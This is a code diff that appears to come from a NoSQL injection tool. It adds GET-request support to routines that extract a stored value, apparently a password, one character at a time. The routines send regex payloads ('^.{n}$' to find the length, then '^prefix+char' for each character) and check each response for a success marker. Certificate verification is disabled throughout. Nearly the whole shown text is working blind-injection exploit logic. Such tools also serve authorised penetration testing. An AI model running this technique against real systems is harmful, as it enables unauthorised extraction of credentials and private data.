@@ -114,7 +114,7 @@ def algMenu(nsi):
     return nsi.alg
 
 
-def slinearPost(nsi):
+def slinear(nsi):
     password = ""
     # length = ""
     form_data = {}
@@ -215,7 +215,11 @@ def dumpKnownValue(nsi, form_data, password):
         #     if "$regex" in element:
         #         form_data[element] = "^.{" + str(c) + "}$"
         iterateParam(form_data, "^.{" + str(c) + "}$")
-        r = requests.post(nsi.url, data=form_data, verify=False)
+        # r = requests.post(nsi.url, data=form_data, verify=False)
+        if (nsi.reqMethod == 2):
+            r = requests.post(nsi.url, data=form_data, verify=False)
+        else:
+            r = requests.get(nsi.url, params=form_data, verify=False)
 
         if nsi.successIdentifier in r.text:
             end_time = time.time()
@@ -236,7 +240,10 @@ def dumpKnownValue(nsi, form_data, password):
                 #     if "$regex" in element:
                 #         form_data[element] = f"^{urllib.parse.quote_plus(password+c)}"
                 iterateParam(form_data, f"^{urllib.parse.quote_plus(password+c)}")
-                r = requests.post(nsi.url, data=form_data, verify=False)
+                if (nsi.reqMethod == 2):
+                    r = requests.post(nsi.url, data=form_data, verify=False)
+                else:
+                    r = requests.get(nsi.url, params=form_data, verify=False)
 
                 if nsi.successIdentifier in r.text:
                     end_time = time.time()
